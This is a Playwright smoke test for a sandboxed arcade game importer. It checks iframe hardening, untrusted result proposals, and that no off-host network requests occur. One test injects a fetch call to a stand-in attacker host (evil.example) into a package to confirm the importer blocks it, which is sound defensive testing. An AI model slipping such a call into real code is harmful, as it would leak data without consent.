/**
 * Creator Foundation CF-4 — local arcade sandbox browser smoke.
 *
 * Proves end-to-end (headless): the sample package imports, runs in a hardened null-origin sandboxed
 * iframe (sandbox="allow-scripts", no allow-same-origin), accepts input + returns an UNTRUSTED result
 * proposal over the postMessage frame contract, makes NO off-host network request, and a malformed
 * package is BLOCKED by the importer (no iframe mounted).
 *
 * Run: tests/creator/run-arcade-sandbox.sh
 */
import { createRequire } from 'node:module';
const require = createRequire(process.env.PW_REQUIRE_BASE || import.meta.url);
const { chromium } = require('playwright');

const BASE = process.env.BASE_URL || 'http://127.0.0.1:8096';
const URL_ = `${BASE}/arcade/creator/arcade-sandbox/index.html`;

let failures = 0;
const check = (name, cond) => { console.log(`${cond ? 'ok  ' : 'FAIL'} ${name}`); if (!cond) failures++; };
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const LOCAL = (u) => /^(http:\/\/(127\.0\.0\.1|localhost)|about:|data:|blob:)/.test(u);

const browser = await chromium.launch({ headless: true });
try {
  const ctx = await browser.newContext();
  const page = await ctx.newPage();
  const errors = [];
  const offHost = [];
  page.on('pageerror', (e) => errors.push('pageerror: ' + e.message));
  page.on('console', (m) => { if (m.type() === 'error') errors.push('console: ' + m.text()); });
  page.on('request', (req) => { if (!LOCAL(req.url())) offHost.push(req.url()); }); // any external request is a failure

  await page.goto(URL_, { waitUntil: 'load' });
  await page.waitForFunction(() => !!window.__cf4_sandbox, null, { timeout: 8000 });

  // import + run the sample in the sandbox
  const report = await page.evaluate(() => window.__cf4_sandbox.loadSampleAndRun());
  check('sample package import is OK', !!report && report.ok === true);
  check('frame dims resolved 360x640', !!report && report.frame_dims && report.frame_dims.width === 360 && report.frame_dims.height === 640);
  check('capabilities empty (deny-by-default)', !!report && Array.isArray(report.capabilities) && report.capabilities.length === 0);
  check('result declared untrusted local proposal', !!report && report.result_trust === 'untrusted_local_proposal');

  // the sandbox iframe is hardened: sandbox="allow-scripts" ONLY (no allow-same-origin)
  const sandboxAttr = await page.evaluate(() => { const f = document.querySelector('#sandboxMount iframe'); return f ? f.getAttribute('sandbox') : null; });
  check('iframe is sandbox="allow-scripts" (null origin, no allow-same-origin)', sandboxAttr === 'allow-scripts');

  // the frame becomes ready over the postMessage contract
  await page.waitForFunction(() => window.__cf4_sandbox.ready === true, null, { timeout: 6000 }).catch(() => {});
  check('sandbox frame signalled ready (postMessage contract)', await page.evaluate(() => window.__cf4_sandbox.ready === true));

  // feed input, request a result proposal
  for (let i = 0; i < 6; i++) { await page.evaluate(() => window.__cf4_sandbox.sendTap()); await sleep(40); }
  await page.evaluate(() => window.__cf4_sandbox.requestResult());
  await page.waitForFunction(() => window.__cf4_sandbox.lastProposal !== null, null, { timeout: 5000 }).catch(() => {});
  const proposal = await page.evaluate(() => window.__cf4_sandbox.lastProposal);
  check('received a result proposal over the frame contract', !!proposal && !!proposal.proposal);
  check('result proposal is NOT server-authorized', !!proposal && proposal.server_authorized === false && proposal.trust === 'untrusted_local_proposal');
  check('proposal carries no ticket/prize/balance authority field', !!proposal && !/ticket|prize|balance|credit|ledger|award/i.test(JSON.stringify(proposal.proposal)));

  // a MALFORMED package (network call in source) is BLOCKED by the importer — no iframe mounted
  const blocked = await page.evaluate(async () => {
    const p = await window.__cf4_sandbox.loadSample();
    p.files['game.mjs'] = p.files['game.mjs'] + '\nfunction _leak(){ fetch("https://evil.example/x"); }';
    const rep = window.__cf4_sandbox.run(p.manifest, p.files);
    return { ok: rep.ok, errors: rep.errors, hasFrame: !!document.querySelector('#sandboxMount iframe') };
  });
  check('malformed package (fetch in source) is BLOCKED', blocked.ok === false && blocked.errors.some((e) => /fetch/.test(e)));
  check('blocked package mounts NO sandbox frame', blocked.hasFrame === false);

  await sleep(200);
  check('NO off-host network request made', offHost.length === 0);
  if (offHost.length) console.log('off-host:', offHost.join(', '));
  check('no console/page errors', errors.length === 0);
  if (errors.length) console.log(errors.join('\n'));
} finally {
  await browser.close();
}

console.log(failures ? `\nARCADE SANDBOX SMOKE: ${failures} FAIL` : '\nARCADE SANDBOX SMOKE: PASS');
process.exit(failures ? 1 : 0);
